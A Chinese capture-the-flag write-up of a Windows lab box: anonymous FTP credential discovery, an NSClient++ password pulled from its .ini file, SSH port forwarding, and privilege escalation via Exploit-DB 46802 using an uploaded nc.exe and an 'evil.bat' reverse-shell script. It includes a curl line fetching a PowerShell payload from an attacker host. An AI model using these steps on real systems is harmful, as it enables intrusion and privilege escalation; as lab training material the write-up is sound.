## 阶段2：工具及利用

### 阶段2.1：FTP匿名访问

从脚本扫描的信息可以获知 FTP 开放了匿名访问，先连上看看有什么。

![](../Images/60797350ecc7bec9034070cedbda1f11.png)  
两个文件夹里的内容都下载到本地，进行查看。得到 `Nathan` 用户它的密码放在了桌面。  
![](../Images/d0e2769b5d6972719c3fd85735ce623c.png)暂时没有其他收获了，搜了下ssh的信息发现存在一个用户名枚举的CVE，尝试利用。  
![](../Images/4be4768bd517f0bf4d70e231da4e0261.png)但是不知道啥环境影响，就是跑不起来…  
![](../Images/225186d253fe8d09df9accd4b34cf054.png)

### 阶段2.2：NVNS-1000 文件读取

然后接下来思路就断了，完全找不到突破口了… 尝试了好久，连SSH密码爆破我都用了还是没用…

## 阶段3：权限提升

在翻手册时，发现有个 `.ini` 的配置文件，通过 SMB 传递到本地分析下。

![](../Images/30e844d4dbea00cd558c8fba0168a767.png)

![](../Images/8db21ce8566f8c7100acd95d1549aa6b.png)

在文件里获得一窜密钥。

![](../Images/fc87765b1f6125f0711026d16b0a39c4.png)

通过网上搜到的文章和官方手册，服务存在 REST API，可以用它查看这个服务的所有可执行脚本（调用时需要验证密码）。

![](../Images/44c95e83439304703aeb928516c3a586.png)  
可以看到，存在很多的脚本，在官方文档内也找到了执行脚本的方法。  
![](../Images/a231eccf16001ce51570cfe6d0d635ca.png)脚本的存放路径：`C:\Program Files\NSClient++\scripts`，接下来的思路就是将反弹shell的脚本载入到服务运行就好了。

首先用的是文件上传接口：  
![](../Images/108e9189b7f02cd38db46675c94006b1.png)

```


curl http://10.10.16.6/p.ps1 -o p.ps1
```

OK，查看下已经成功上传到了服务器。  
![](../Images/cda55527f46b8e8ead3ea254a0dfc4aa.png)

但还是有问题，文件内容为空，why？看了下curl的详情信息，只有Header没有Body。我特么裂开…

![](../Images/0eb2ba39f303711535259143c90bae3b.png)  
这里换一个方向，转而尝试前台的用户登录。但输入密码后会提示没权限…  
![](../Images/c8fba386955ac0d19b467fef8a2de529.png)又卡了我半天…  第二天开始抄一把答案，发现是因为 `NSClient++` 启动的配置设置了访问IP为本地 `127.0.0.1`，所以需要进行端口转才行。  
![](../Images/2264477c6be776cf15122276ca0c5b3a.png)

```

sshpass：一个免交互 SSH 登录工具
```

访问本地的端口，输入密码成功登录服务。  
![](../Images/9068566ab4312dc2b489fcb0b4721460.png)  
在 exploit 中有一个权限提升的栗子：  
![](../Images/a22700312257876d933d111a458f56a9.png)

> https://www.exploit-db.com/exploits/46802

经过多次尝试后才成功提权。

首先上传 nc.exe 到服务器后，在编写一个执行反连的批处理脚本也上传到服务器。

evil.bat:

```

@echo off
```

  
进入对应的视图：`Settings > External Scripts > Scripts` 添加脚本。

![](../Images/bb830ab2b5f98f6efe374ce9d8f6e61b.png)  
在 `Settings > Scheduler > Schedules` 添加定时执行的设置。  
![](../Images/7ab5e6dcb0817582ca1c59fbea6fa52d.png)点击重启，等待NC等反连即可。  
![](../Images/727ad5755b1f5f3e38aac59548183b9a.png)OK，提权成功。  
![](../Images/2e616252b47a70abb2ce9ff6a9b03acf.png)
